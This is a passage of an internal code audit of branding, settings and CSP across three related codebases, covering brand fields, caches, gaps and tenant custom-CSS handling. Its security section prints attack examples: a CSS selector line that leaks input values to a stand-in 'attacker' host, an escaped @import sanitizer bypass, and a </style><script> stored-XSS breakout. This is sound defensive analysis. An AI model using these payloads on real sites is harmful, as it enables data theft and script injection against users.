  `app/web/customer/branding.py`: module cache 30 s Lock-guarded (:20,:30-36,
  :119-137); `customer_branding_context` :140-224 — unauthenticated path
  `resolve_brand(db)` :158; authenticated path re-resolves with `subscriber_id`
  :196-207 giving **per-customer brand**, sets `app_name = brand.product_name`;
  the returned `brand` key **overrides the static Jinja global**.
  Portal timezone hardcoded `_PORTAL_DISPLAY_TZ = ZoneInfo("Africa/Lagos")` :51,
  `"WAT"` :52.
- **Reseller portal** — `app/web/reseller/branding.py:56-103`, overrides from
  `request.state.reseller_brand` (:82-94), produced by
  `app/services/web_reseller_routes.py:100-107`
  (`resolve_brand(db, reseller_id=...).to_dict()`).
- **Auth pages** — `app/web/portal_branding.py:27-47`.
- **Admin sidebar aggregator** — `app/services/web_admin.py:160-222`, module
  cache with `_SIDEBAR_STATS_TTL_SECONDS`; brand block :186-198; emits
  `"brand": resolved_brand.to_dict()` :214.
- **Landing** — `app/web_home.py:23-29`.

Template consumption: `templates/base.html` — `brand_product_name` :7,
`brand_primary_color` :8, favicon chain :10-14, static links :15-19,
`<link rel="manifest" href="/branding/manifest.webmanifest">` :20, `<meta
theme-color>` + inline `:root{--brand-primary}` :21-24, OG image hardcoded
:28-31, **`<link rel="stylesheet" href="/branding/theme.css">` :51**,
`window.themeColor()` token resolver :53-62. Layouts
`templates/layouts/{admin.html:228-243, auth.html:9-53,
customer.html:49-568, customer_auth.html:10-57}`; auth pages, reseller auth
pages, `templates/index.html:16-150` (uses `landing_brand.logo_url /
dark_logo_url / name / tagline / support_phone / support_email /
legal_address / legal_name`).

### Sub PDF / document branding

`app/services/billing_invoice_pdf.py`:
- `_branded_company_info` :124-137 — `company_name←brand.legal_name`,
  `company_email←brand.support_email`, `company_phone←brand.support_phone`,
  address from `brand.legal_address`.
- `_logo_src` :141-167 — resolves to a data URI: explicit arg, else comms
  `sidebar_logo_url`; handles `data:` (:148), `/branding/assets/` via StoredFile
  → base64 (:150-160), `/static/` via filesystem → base64 (:161-166).
- HTML/WeasyPrint path — `resolve_brand(db, subscriber_id=account_id)` :250,
  `company_name = html.escape(brand.legal_name)` :255, logo markup with
  initial-letter fallback :261-264, **footer** `.footer` :374-375 / markup
  :454-457 (`Prepared by {company_name}` / `Thank you for your business.`).
- Raster fallback `_build_branded_fallback_pdf` :583+ — `green_900 =
  brand.primary_color` :621, `green_700 = brand.secondary_color` :622, footer
  :905-917.

Document services that do **not** consume `resolve_brand`:
`app/services/billing_payment_receipts.py`, `web_billing_documents.py`,
`web_billing_statements.py`, `team_inbox_delivery_receipts.py`.

### Sub email branding

`app/services/email_template.py::wrap_email_html` :140+ —
`resolved_brand = dict(brand) if brand is not None else get_brand()` **:163**
(DB-resolved brand wins when passed, else static `brand.json`); `base ←
app_url` :164; `primary`/`secondary` :165-166; `configured_logo ←
resolved_brand.get("logo_url")` :167 (present only for `ResolvedBrand` dicts)
else `/static/branding/favicon/icon-192.png` :168-172;
`safe_company ← legal_name` :174-176; `safe_support ← support_email` :177-181.
`EMAIL_CANVAS_COLOR = "#F4F4F9"` :23.

`app/services/email.py` — SMTP `from_name`: `env SMTP_FROM_NAME` >
`setting smtp_from_name` > `get_brand()["from_name"]` :234-236 (**env-first,
opposite of the DB-authoritative settings rule**); default sender profile :313;
`From:` header :849-853; `_get_company_name` :625-641 (company setting →
`get_brand()["legal_name"]`); `_get_email_branding_logo_url` :659-684 (comms
`sidebar_logo_url` → `sidebar_logo_dark_url` → static icon).
**`DOTMAC_RED = "#FF0000"` hardcoded at :134**, used at :645, :715, :1209,
:1219 — a brand leak that ignores both brand systems.

Brand-aware senders (pass `ResolvedBrand`): `app/tasks/notifications.py:322-328`,
`app/services/notification_adapter.py:301-309`,
`app/services/web_catalog_subscriptions.py:1360-1372`.
Static-brand-only consumers: `web_customer_actions.py:63,1075,1156-1158`,
`ncc_report_email.py:26,46`, `ticket_mentions.py:16,249`,
`staff_notifications.py:271-273`,
`app/services/events/handlers/notification.py:905,918,961,963`,
`web_system_export_tool.py:1084-1091`.

Other `resolve_brand` consumers: `app/services/support.py:1542-1552`
(helpdesk fallback recipient), `app/services/team_inbox_projection.py:745,781-784`.

### Sub mobile branding

`mobile/lib/src/config/env.dart` — `class Env` :11 (`apiBaseUrl` ←
`API_BASE_URL` default `https://selfcare.dotmac.io` :15-18, `apiPrefix
'/api/v1'` :21, `glitchtipDsn` :30-31); `class Brand` :60 with docstring
:46-58 explaining `--dart-define-from-file=../brand.json`:
`name` ← `BRAND_MOBILE_APP_NAME` :63-64, `tagline` :66-69, `supportEmail`
:73-74, `legalName` :76-77, `version` ← `APP_VERSION` :80-81,
`_primaryColorHex` :84-85, five `_semantic*ColorHex` :87-104, **`paymentScheme`
← `BRAND_PAYMENT_SCHEME` default `'dotmacpay'` :110-111** ("Kept unique per
brand so two white-label apps on one device don't collide").

Consumers: `mobile/lib/src/app.dart:82,98`, `core/semantic_colors.dart:35-59`,
**`core/payment_link_handler.dart:41`**, `providers/auth_controller.dart:231`,
`features/auth/lock_screen.dart:56`, `features/settings/settings_screen.dart:50-59`.

Native: `mobile/android/app/build.gradle.kts:48-52` templatizes the scheme
(`manifestPlaceholders["paymentScheme"]`), consumed at
`AndroidManifest.xml:48`; **iOS hardcodes `dotmacpay`**
(`mobile/ios/Runner/Info.plist:42,51-53`). `applicationId =
"io.dotmac.selfcare"` (build.gradle.kts:40), `android:label="Dotmac Selfcare"`
(AndroidManifest.xml:14). CI `mobile/ios/ci_scripts/ci_post_clone.sh:40-47`
uses `--dart-define-from-file=../brand.json`.

`field_mobile/` — `lib/app/theme.dart:9-57` reads `BRAND_PRIMARY_COLOR`,
`BRAND_SECONDARY_COLOR`, five `BRAND_SEMANTIC_*` with hardcoded int fallbacks;
`features/auth/auth_state.dart:7-10` `API_BASE_URL` default
**`https://sub.dotmac.io`** (differs from self-care). **Gap:**
`field_mobile/ios/ci_scripts/ci_post_clone.sh:48-49` passes only
`API_BASE_URL` + `SENTRY_DSN` — **no `--dart-define-from-file=../brand.json`**,
so field-app release builds are never white-labelled.

`mobile/dart_defines.example.json:6-8` ships `BRAND_PRIMARY_COLOR "#3b82f6"`
and `BRAND_MOBILE_APP_NAME "DotMac Self-Care"` — contradicting `brand.json`.

### Sub caches (all brand-related)

| cache | location | scope / TTL |
| --- | --- | --- |
| `lru_cache(maxsize=1)` on `get_brand()` | `branding_config.py:94` | process lifetime; only clearable via the **uncalled** `reset_brand_cache()` :110-112 |
| Jinja global snapshot | `brand_globals.py:156` (`setdefault`) | per `Jinja2Templates` instance, at startup |
| `db.info["brand_profiles.legacy"]` | `brand_profiles.py:26,89,139` | per DB Session |
| `db.info["brand_profiles.active_profiles"]` | `brand_profiles.py:27,150-164,285,375` | per DB Session |
| customer portal branding | `app/web/customer/branding.py:20,30-36,119-137` | module-global, 30 s, Lock |
| reseller portal branding | `app/web/reseller/branding.py:16,26-53` | module-global, 30 s, Lock |
| admin sidebar stats (incl. `brand`) | `app/services/web_admin.py:162,168-174,218-221` | module-global TTL |
| Redis settings cache (logo/favicon/colour settings) | `app/services/settings_cache.py:30-38` | prefix `settings:`, TTL 30 s |
| HTTP | `app/web/public/branding.py:126,185,209` | theme.css 300 s, manifest 3600 s, assets 3600 s |

### Sub gaps

1. `reset_brand_cache()` has no callers; the Jinja `setdefault` snapshot would
   survive a cache clear anyway.
2. `BRAND_MOBILE_APP_NAME` / `API_BASE_URL` are in `brand.json` but absent from
   `_KEY_MAP` — mobile-only keys the backend never validates.
3. `DOTMAC_RED = "#FF0000"` hardcoded into transactional emails.
4. **`/branding/theme.css` resolves brand with no scope** (`branding.py:94`), so
   reseller/organization colour overrides never reach CSS variables; only the
   inline `--brand-primary`/`<meta theme-color>` in `base.html:21-24` can vary
   per request.
5. `mobile/dart_defines.example.json` contradicts `brand.json`.
6. `field_mobile` CI omits the brand file.
7. iOS payment scheme hardcoded while Android templatizes it.
8. `company_vat_number`, `company_registration_id`, bank details
   (`web_system_company_info.py:26-31`) are in billing settings but **not** in
   `BrandProfile`/`ResolvedBrand` and never appear on invoice PDFs.
9. `.env.example` documents none of the `BRAND_*` / `SIDEBAR_LOGO_URL` /
   `FAVICON_URL` / `*_OVERRIDE` env inputs.
10. `alembic/versions/267_brand_profiles.py:3` docstring revision id disagrees
    with `revision` at :14; the SOT doc repeats the stale id.
11. **No test covers `branding_config.get_brand()` precedence** — that path is
    uncharacterized (contrast the starter's `tests/unit/test_branding.py`).

---

# 2. Consolidated brand-field matrix

Union of every brand field found in any repo. Cells: how that repo sources it.
`—` = absent. Grouped for readability; row numbers are continuous.

## 2.1 Identity

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 1 | display / brand name | env `BRAND_NAME` / brand.json / DB `ui_branding.name` | env `BRAND_NAME` / DB `organization_branding.display_name` | env / brand.json / DB `brand_profiles.brand_name` |
| 2 | product name | — | — | env `BRAND_PRODUCT_NAME` / brand.json / DB `brand_profiles.product_name` |
| 3 | legal entity name | — | DB `Organization.legal_name` | env `BRAND_LEGAL_NAME` / brand.json / DB `brand_profiles.legal_name` / billing setting `company_name` |
| 4 | trading name / DBA | — | DB `Organization.trading_name` | — |
| 5 | tagline | env / brand.json / DB `ui_branding.tagline` | env `BRAND_TAGLINE` / DB `organization_branding.tagline` | env / brand.json / DB `brand_profiles.tagline` |
| 6 | brand mark (2-4 letters) | **read by templates, never produced** (hardcoded `"A"`) | env `BRAND_MARK` / DB `organization_branding.brand_mark` / **two** auto-derivations | — |
| 7 | slug / portal identifier | `Tenant.slug` (tenancy, not brand) | DB `Organization.slug` (careers portal) | — |
| 8 | brand provenance (`source_scope`) | — | — | `ResolvedBrand.source_scope` / `source_scope_id` |

## 2.2 Imagery

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 9 | logo (light) | DB `ui_branding.logo_url` — **no reader** | env `BRAND_LOGO_URL` / DB `organization_branding.logo_url` / `Organization.logo_url` | DB `brand_profiles.logo_url` / comms setting `sidebar_logo_url` |
| 10 | logo (dark) | — | DB `organization_branding.logo_dark_url` | DB `brand_profiles.dark_logo_url` / comms `sidebar_logo_dark_url` |
| 11 | favicon | **absent entirely** | DB `organization_branding.favicon_url` | DB `brand_profiles.favicon_url` / comms `favicon_url` |
| 12 | PWA icon set (192/512/apple-touch) | — | — | static `static/branding/favicon/*` via `/branding/manifest.webmanifest` |
| 13 | login hero image (per portal) | — | — | comms `login_hero_{customer,reseller,admin}_url` + static fallback |
| 14 | OG / social share image | — | — | hardcoded `/static/illustrations/og-image.png` |
| 15 | uploaded-asset storage + allowlist | — | filesystem/S3 (`branding_upload_dir`, `branding_allowed_types`, `branding_max_size_bytes`), served **unauthenticated** | `StoredFile` `entity_type="branding_asset"` via `/branding/assets/{id}`, URL allowlist enforced |

## 2.3 Colour

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 16 | primary colour | env / brand.json / DB `ui_branding.primary_color` (hex-validated) — **inert at runtime** | DB `organization_branding.primary_color` | env / brand.json / DB `brand_profiles.primary_color` → 11-stop scale |
| 17 | primary light variant | — | DB `organization_branding.primary_light` (auto-derived) | derived (`generate_scale`) |
| 18 | primary dark variant | — | DB `organization_branding.primary_dark` (auto-derived) | derived |
| 19 | accent / secondary colour | env / brand.json / DB `ui_branding.accent_color` — **inert at runtime** | DB `organization_branding.accent_color` | env `BRAND_SECONDARY_COLOR` / brand.json / DB `brand_profiles.secondary_color` |
| 20 | accent light variant | — | DB `organization_branding.accent_light` | derived |
| 21 | accent dark variant | — | DB `organization_branding.accent_dark` | derived |
| 22 | semantic positive / success | — | DB `organization_branding.success_color` | env / brand.json / `metadata_.semantic_colors` / comms setting — **WCAG-AA gated** |
| 23 | semantic warning | — | DB `organization_branding.warning_color` | same as above |
| 24 | semantic negative / danger | — | DB `organization_branding.danger_color` | same as above |
| 25 | semantic info | — | — | same as above |
| 26 | semantic neutral | — | — | same as above |
| 27 | categorical data palette | — | — | derived `--color-data-1..7` from `CATEGORICAL_COLOR_ROLES` |
| 28 | legacy Tailwind palette aliases | — | — | derived `LEGACY_TAILWIND_PALETTE_ROLES` |

## 2.4 Typography and component shape

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 29 | display font family | build-time Tailwind `@theme` `--font-display` | DB `organization_branding.font_family_display` (Google Fonts) | build-time Tailwind |
| 30 | body font family | build-time Tailwind `--font-sans` | DB `organization_branding.font_family_body` | build-time Tailwind |
| 31 | mono font family | — | DB `organization_branding.font_family_mono` | — |
| 32 | Google Fonts import URL | — (fonts vendored) | generated endpoint `/branding/org/{id}/fonts-url` | — (fonts vendored) |
| 33 | border-radius preset | — | DB `organization_branding.border_radius` enum | — |
| 34 | button-style preset | — | DB `organization_branding.button_style` enum | — |
| 35 | sidebar-style preset | — | DB `organization_branding.sidebar_style` enum | — |
| 36 | **raw custom CSS** | DB `ui_branding.custom_css`, sanitized on READ only | DB `organization_branding.custom_css`, **unsanitized** | **absent by design** |

## 2.5 Contact, legal, and registration

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 37 | support email | env `BRAND_SUPPORT_EMAIL` / brand.json — **no reader** | DB `Organization.contact_email` | env / brand.json / DB `brand_profiles.support_email` / billing `company_email` |
| 38 | support phone | — | DB `Organization.contact_phone` | DB `brand_profiles.support_phone` / billing `company_phone` |
| 39 | app / canonical URL | env `BRAND_APP_URL` / brand.json — **no reader** | env `APP_URL` (PDF assets only) | env / brand.json / DB `brand_profiles.app_url` (validated absolute) |
| 40 | website URL | — | DB `Organization.website_url` | — |
| 41 | portal domain | `Tenant`/`TenantDomain` rows (tenancy, not brand) | — | DB `brand_profiles.portal_domain` |
| 42 | legal / postal address | — | DB `Organization.address_line1/2`, `city`, `state`, `postal_code`, `country` | DB `brand_profiles.legal_address` (JSON) / billing `company_address_*` |
| 43 | tax identification number | — | DB `Organization.tax_identification_number` | billing `company_vat_number` — **not in BrandProfile** |
| 44 | company registration number | — | DB `Organization.registration_number` | billing `company_registration_id` — **not in BrandProfile** |
| 45 | jurisdiction / country of incorporation | — | DB `Organization.jurisdiction_country_code`, `incorporation_date` | — |
| 46 | bank details (name/account/branch) | — | — | billing `company_bank_*` — **not in BrandProfile** |

## 2.6 Comms identity

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 47 | email from-address | — | setting `smtp_from_email` / env / `noreply@example.com`; per-profile `email_profile.from_email` | env `BRAND_FROM_EMAIL` / brand.json / DB `brand_profiles.from_email` |
| 48 | email from-name | — | setting `smtp_from_name` / env / `"Dotmac ERP"` | env `BRAND_FROM_NAME` / brand.json / DB `brand_profiles.from_name` |
| 49 | email reply-to | — | setting `email_reply_to` / env / `email_profile.reply_to` | — |
| 50 | email logo URL | — | setting `email_logo_url` — **write-only, never consumed** | comms `sidebar_logo_url` → static icon |
| 51 | email accent colour | — | `_DEFAULT_ACCENT #d97706` | **hardcoded `DOTMAC_RED #FF0000`** |
| 52 | per-template email subject / from-name | — | `document_template.email_subject`, `.email_from_name` | — |

## 2.7 Documents / PDF

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 53 | report / document logo URL | — | setting `report_logo_url` — **key never present in context; write-only** | via `resolve_brand().logo_url` → data URI |
| 54 | include logo in reports (bool) | — | setting `include_logo_in_reports` default `True` | — |
| 55 | report watermark text | — | setting `report_watermark_text` | — |
| 56 | report page orientation / size / margins | — | setting `report_orientation`; `document_template.page_size/page_orientation/page_margins` | — |
| 57 | document header config | — | `document_template.header_config` JSONB | hardcoded in `billing_invoice_pdf` |
| 58 | document footer text | — | **`organization_branding.payslip_footer_text` — orphaned DB column** | hardcoded `Prepared by {legal_name}` / `Thank you for your business.` |
| 59 | confidentiality notice | — | **`organization_branding.payslip_confidentiality_notice` — orphaned** | — |
| 60 | document template variant | — | **`organization_branding.payslip_template` — orphaned** | — |
| 61 | per-template CSS | — | `document_template.styles` | — |

## 2.8 Locale / financial defaults

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 62 | functional currency | — | DB `Organization.functional_currency_code` / env `DEFAULT_CURRENCY_CODE` (**derived from host locale**) | billing setting `default_currency`, default `NGN` (`display_format.py:34`) |
| 63 | presentation currency | — | DB `Organization.presentation_currency_code` | — |
| 64 | timezone | `display/timezone` setting (not modelled as brand) | DB `Organization.timezone` | **hardcoded `Africa/Lagos`/`WAT`** (`customer/branding.py:51-52`, `display_format.py:35`) |
| 65 | date format | `display/date_format` setting | DB `Organization.date_format` | hardcoded filters |
| 66 | datetime format | `display/datetime_format` setting | — | hardcoded filters |
| 67 | number format | — | DB `Organization.number_format` | — |
| 68 | language / locale | — | `locales/` + `t()` Jinja global | — |

## 2.9 Marketing / app-shell copy

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 69 | landing hero copy (badge/title/subtitle/CTAs) | — | env `LANDING_*` / `LANDING_CONTENT_JSON` | hardcoded in `templates/index.html` |
| 70 | app version string | `VERSION` file | env `APP_VERSION` (Jinja global) | env `APP_VERSION` (Jinja global) |

## 2.10 Mobile / multi-runtime (carried in `brand.json`)

| # | Field | starter | ERP | Sub |
| --- | --- | --- | --- | --- |
| 71 | mobile app display name | — | — | brand.json `BRAND_MOBILE_APP_NAME` (Flutter only) |
| 72 | mobile payment URL scheme | — | — | env `BRAND_PAYMENT_SCHEME` / brand.json; Android templatized, **iOS hardcoded** |
| 73 | mobile API base URL | — | — | brand.json `API_BASE_URL` (two different defaults across the two apps) |
| 74 | error-reporting DSN / environment | — | — | brand.json `GLITCHTIP_DSN` / `GLITCHTIP_ENVIRONMENT` |

**Union size: 74 distinct brand or brand-adjacent fields.**

Coverage counts (fields with a real, consumed source in that repo):

- **starter — 6 static + 6 tenant-overridable, of which 3 have no reader.**
  Effective consumed brand surface: **name, tagline** (plus two inert colours).
- **ERP — ~40**, the only repo with typography, component-shape presets, and
  document/PDF branding; 4 of those fields are orphaned schema.
- **Sub — ~35**, the widest *consumed* surface, the only one with scoped
  (reseller/organization) profiles, semantic-colour accessibility gating, and
  brand provenance.

**Rows where all three repos agree on the source shape: 3** (display name,
tagline, primary colour) — and even those disagree on runtime meaning (§6.2).

---

# 3. Tenant custom CSS

## 3.1 Where a tenant can supply raw CSS

| repo | raw CSS? | storage |
| --- | --- | --- |
| starter | **yes** | `domain_settings` row, `domain='branding'`, `key='ui_branding'`, JSONB `value_json["custom_css"]` (`packages/dotmac-kernel/src/dotmac_kernel/settings_models.py:56-124`) |
| ERP | **yes** | `core_org.organization_branding.custom_css` (Text) — `app/models/finance/core_org/organization_branding.py:227-231`, migration `alembic/versions/add_organization_branding.py:117` |
| Sub | **no** | token-only; repo-wide grep for `custom_css`, `theme_override`, `custom_theme`, `white_label`, `oem` across `app/` and `templates/` → **zero hits** |

## 3.2 starter — storage, sanitization, injection

- **Write path**: `POST /admin/settings/branding` →
  `app/features/settings/web.py:284-322` → `settings_service.update_setting`
  (`app/features/settings/service.py:62-74`) → `validate_spec_value`. For a
  `json` spec that check only asserts `isinstance(coerced, dict)`
  (`settings_resolver.py:310-313`). **The raw, unsanitized CSS lands in the
  database.**
- **Read/sanitize path**: `load_branding` → `sanitize_branding_css`
  (branding.py:196-210). **Read-side only.**
- **Sanitizer behaviour** (branding.py:118-126, 186-210):
  - hard reject: any `<` anywhere → returns `""` (:204-205)
  - `url(...)` scheme allowlist — only `http`/`https` survive; schemeless
    (relative) URLs survive; everything else deleted (`_sanitize_css_url` :186-193)
  - regex-deleted: `@import …;`, `behavior:…`, `expression(…)`, `javascript:`
    (:121-126)
- **Injection point**: exactly one —
  `packages/dotmac-kernel/src/dotmac_kernel/templates/admin/settings/branding.html:68`

  ```html
  <style>{{ brand.custom_css | safe }}</style>
  ```

  The repo's only `| safe`, guarded by
  `tests/architecture/test_web_conventions.py::test_safe_filter_only_used_with_a_sanitize_comment_nearby`.
  It sits on the branding-editor page only — **the tenant's CSS is not applied
  to any other admin page**. A `<style>` element is document-scoped, so on that
  one page it styles the whole shell (`layouts/admin.html` → sidebar, nav,
  forms), but `/admin`, `/admin/parties`, `/admin/rbac` are unaffected. This
  scoping is incidental, not designed.
- **Leak path**: the JSON API `GET /settings/branding`
  (`app/features/settings/router.py:26-34` → `service.list_settings` →
  `resolve_value`) returns the stored dict **unsanitized**, because the
  sanitizer lives in `load_branding`, not in the resolver.

## 3.3 ERP — storage, sanitization, injection

- **Storage**: `organization_branding.custom_css` Text.
- **Sanitization: none, at any layer.** `BrandingBase.custom_css` is a bare
  `str | None` with **no validator** (`app/schemas/finance/branding.py:161-164`)
  — contrast the colour fields, which are regex-validated
  (`validate_hex_color` :39-49, wired :167-181). The admin form path
  (`app/services/admin/settings_web.py:391,394-406`) bypasses Pydantic entirely
  and `setattr`s raw form strings. `app/templates.py:160-232` has a
  `sanitize_html` filter — never applied to branding.
- **Generation**: `CSSGenerator.generate()`
  (`app/services/finance/branding.py:170-252`) emits a `:root{}` block plus
  `!important` button/sidebar overrides (:254-320), then:

  ```python
  # Custom CSS injection
  if branding.custom_css:                     # branding.py:247
      lines.append("")
      lines.append("/* Custom CSS */")
      lines.append(branding.custom_css)       # branding.py:250
  ```

- **Injection points**:
  - `templates/partials/_org_branding_head.html:1-10` —
    `<style id="org-branding">{{ org_branding.css | safe }}</style>`, carrying
    an explicit `{# nosemgrep: semgrep.safe-on-user-content #}` at :7. Included
    at line 5-6 of **10 module base layouts** (expense, coach, procurement,
    inventory, people, finance, public_sector, modules, help, fixed_assets).
  - `templates/login.html:7-12` — `{{ brand.css | safe }}`, pre-auth.
  - `templates/careers/base_careers.html:30-40` — `{{ brand.css | safe }}`,
    **public unauthenticated** careers portal.
- **Unauthenticated read**: `GET /branding/org/{org_id}/css`
  (`app/api/settings.py:716-733`) — `get_db_admin_bypass`, docstring at :729
  says *"No authentication required for CSS serving"*. Fonts URL :736-748 also
  unauthenticated. `POST /branding/preview-css` :751-781 requires
  `settings:manage`.

## 3.4 The CSP consequence — literal policy strings

**starter** — `packages/dotmac-kernel/src/dotmac_kernel/middleware/security_headers.py`,
emitted on every response, with a tightening-only `CONTENT_SECURITY_POLICY`
compatibility value
(`config.py:39`, `.env.example:62`), disableable by `SECURITY_HEADERS_ENABLED`:

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
```

Two directives exist *because of* tenant branding, stated in the module
docstring and `docs/SECURITY.md:46-74`:

- `style-src 'unsafe-inline'` — "covers the sanitized per-tenant `custom_css`
  preview" (security_headers.py:25-27)
- `img-src ... https:` — "tenants may set an external https `logo_url` in
  branding" (security_headers.py:30-31)

So **retiring tenant custom CSS + external logo URLs is exactly what buys back
`style-src 'self'` and `img-src 'self' data:`**. (`'unsafe-inline'` would still
be needed for Alpine's `x-show` inline-style toggling unless that is also
changed.) The 2026-08-25 correction records that Starter already vendors
Alpine's CSP build, so the stale `'unsafe-eval'` grant was removed. Pinned by
`tests/unit/test_security_baseline.py::test_strict_csp_has_no_external_origins`.

**ERP** — `app/middleware/csp.py` + `app/main.py:378-379`. Nothing sets a CSP
upstream, so `add_unsafe_eval_to_csp(None)` runs with `policy=None`. With
`CSP_ALLOW_UNSAFE: 'true'` — **which `docker-compose.yml:21` sets** — the literal
header is:

```
script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net
```

With `CSP_ALLOW_UNSAFE` unset (`csp.py:45-49,54-56`):

```
script-src 'self' https://cdn.jsdelivr.net
```

Either way: **one directive.** No `default-src`, `style-src`, `object-src`,
`frame-ancestors`, `base-uri`, `form-action`, `img-src`, or `connect-src`.
Style and image loading are entirely unconstrained; the deployed variant also
permits inline script and a third-party script CDN. Other headers are set at
`app/main.py:383-392` (`X-Frame-Options` DENY except the SLA-document route,
nosniff, Referrer-Policy, HSTS).

**Sub** — **no CSP at all.** `app/main.py:1361-1382` sets only
`X-Content-Type-Options`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy`, and
conditional HSTS. `nginx/selfcare.dotmac.io.conf:50-56` adds HSTS,
X-Frame-Options, nosniff, X-XSS-Protection, Referrer-Policy — still no CSP. Sub
is also the only repo that does not need one for CSS, since it never renders
tenant-authored style text.

## 3.5 What a hostile or careless tenant CSS can still do

### ERP: this is stored XSS today, not a hypothetical

`branding.custom_css` is appended verbatim (`branding.py:250`) into text that is
rendered `{{ ... | safe }}` inside `<style>…</style>` in **10 module base
layouts**, the login page, and the **public careers portal**. Because the value
is never escaped and never parsed, a `custom_css` containing
`</style><script>…</script>` renders as live markup. ERP's CSP has no
`default-src` and no `style-src`, and the deployed policy explicitly allows
`'unsafe-inline'` script — nothing stops it. The same content is additionally
served **unauthenticated** at `GET /branding/org/{org_id}/css`
(`app/api/settings.py:716-733`) to anyone holding an org UUID. The
`{# nosemgrep: semgrep.safe-on-user-content #}` at
`templates/partials/_org_branding_head.html:7` shows the finding was seen and
waived.

### starter: sanitized, but CSS alone remains powerful

Assuming the sanitizer holds, the following are fully expressible and are *not*
what the sanitizer targets:

1. **Hide or rewrite legal/consent text.** CSS can `display:none` any element,
   and `::before/::after { content: "…" }` substitutes different visible text.
   Nothing in `_DANGEROUS_CSS_PATTERNS` touches `content`, `display`,
   `visibility`, `opacity`, or `font-size:0`. On a consent or terms screen a
   tenant could hide the real obligation and render a friendlier one. The
   starter's current single-page injection scope limits this today, but the
   obvious next feature request ("apply my branding to the whole portal") makes
   it global.
2. **Reposition / overlay security-relevant UI.** `position:fixed`, `z-index`,
   `transform`, `pointer-events` and `!important` are all untouched.
   Same-origin clickjacking (an invisible overlay over "Delete tenant" or
   "Grant admin role") needs no iframe and is therefore **not** stopped by
   `frame-ancestors 'none'`.
3. **Exfiltrate visible data over the network.** The sanitizer *explicitly
   permits* `http`/`https` inside `url()` (branding.py:190-192) and the CSP
   permits `img-src ... https:` — both for the logo-URL use case. The classic
   attribute-selector oracle `input[value^="a"] { background:
   url(https://attacker/a) }` is allowed by both. Anything CSS can select on
   (attribute values, `:checked`, font-ligature text leaks) can be shipped to a
   third-party host.
4. **Denial of service / lockout.** `body { display:none }` makes the portal
   unusable for that tenant's admins — including the branding editor needed to
   undo it. There is no "reset branding" affordance and no preview-before-apply.
5. **Real sanitizer bypasses.** The regexes are plain-text keyword matches on
   unescaped input. CSS permits identifier escapes, so
   `@\69 mport "https://attacker/x.css";` is valid CSS, is **not** matched by
   `re.compile(r"(?is)@import\b[^;{}]*;?")`, and would import a remote
   stylesheet. (In the starter that import is separately blocked by
   `style-src 'self'`; in ERP, which has no `style-src`, nothing blocks it.)
   The blanket `"<" in sanitized → ""` reject is a heuristic, not a parser, and
   also blanks legitimate CSS.
6. **Sanitization is read-side only in the starter.** The raw value is stored
   and returned raw by the JSON settings API. Any second consumer — an export, a
   future email template, a downstream service — is unprotected.

### Verdict

Raw tenant CSS is not sanitizable in the sense that matters. Even a *perfect*
sanitizer that guaranteed "this is only CSS" leaves items 1-4 — text
substitution over legal copy, overlay of destructive controls, and network
exfiltration via `url()` — because those are CSS's intended semantics, not
injection bugs. It is also the sole reason the starter's CSP carries
`style-src 'unsafe-inline'` and `img-src https:`, and it is an unmitigated
stored-XSS vector in ERP today.

Sub already runs the alternative in production: a fixed, validated set of brand
tokens (6-digit hex, WCAG-AA-gated semantic colours, allowlisted asset URLs)
expanded server-side into `:root{--color-*}` custom properties at
`/branding/theme.css`, with zero tenant-authored CSS text.

**Recommendation for the F0 decision: retire tenant custom CSS in both starter
and ERP in favour of an allowlisted token set on the Sub `theme.css` model.**
Concrete consequences to plan for:

- starter CSP tightens to `style-src 'self'` (subject to the Alpine `x-show`
  question) and `img-src 'self' data:` once external `logo_url` is replaced by
  an uploaded, self-hosted asset served from the app's own origin.
- ERP must gain a real CSP at all, plus a migration path for existing
  `organization_branding.custom_css` rows (§6.5).
- The token set must cover what ERP tenants currently express through raw CSS:
  the three component-shape presets (`border_radius`, `button_style`,
  `sidebar_style`) already exist as enums and should be promoted to first-class
  tokens rather than left as the reason someone reaches for `custom_css`.

---

# 4. Settings facilities, per repo

## 4.1 starter

**Typed registry/resolver: yes**, in the kernel —
`packages/dotmac-kernel/src/dotmac_kernel/settings_resolver.py`.

- `SettingSpec` frozen dataclass (:48-66): `domain`, `key`, `value_type`,
  `default`, `label`, `allowed`, `min_value`, `max_value`, `is_secret`,
  **`validator`** (a `Callable[[object], None]` — unique to the starter).
  Explicitly documented at :52-55 as Sub's `SettingSpec` **minus `env_var`**.
- `register_specs(specs)` :72-80 → module-level `_REGISTRY: dict[(SettingDomain,
  str), SettingSpec]` :69. `all_specs()` :83, `get_spec()` :87-95.

**Resolution order** — `resolve_with_source` :157-239, delegated to by
`resolve_value` :242-276:

```
tenant row (tenant_id = <tenant>, is_active = true)
  > platform row (tenant_id IS NULL, is_active = true)
  > SettingSpec.default
```

With degradation: a stored value failing coercion, `allowed`,
`min_value`/`max_value`, or the spec `validator` **silently falls back to the
spec default** and reports `source="default"` (:204-228). `json` values are
`deepcopy`d before return so callers cannot mutate the shared spec default
(:230-237). An unregistered key raises `KeyError` unless an explicit `default=`
kwarg is passed (:181-186). **`resolve_with_source` is the only
provenance-returning resolver of the three repos.**

**Storage**: one table, `domain_settings` — `settings_models.py:56-124`.
`tenant_id` NULLABLE (NULL = platform default). Two partial unique indexes
`uq_domain_settings_platform` / `uq_domain_settings_tenant` (:75-89) and a
`ck_domain_settings_value_alignment` CHECK on the `value_text`/`value_json`
split (:70-74). Domains (`SettingDomain` :37-42, five): `auth`, `audit`,
`branding`, `custom_fields`, `display`. RLS in the migration.

**How a feature declares a setting**: build `SettingSpec`s in the feature's own
